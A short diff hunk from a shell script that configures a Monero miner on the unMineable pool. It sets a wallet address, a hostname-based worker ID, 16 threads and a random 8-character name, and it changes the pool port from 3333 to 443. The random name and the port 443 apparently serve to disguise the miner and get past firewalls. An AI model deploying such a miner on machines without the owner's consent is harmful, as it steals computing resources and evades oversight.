@@ -5,7 +5,7 @@ COIN="XMR"
 ADDRESS="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
 WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"
 WALLET="$COIN:$ADDRESS.$WORKER_ID"
-POOL="rx.unmineable.com:3333"
+POOL="rx.unmineable.com:443"
 THREADS=16
 RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
 
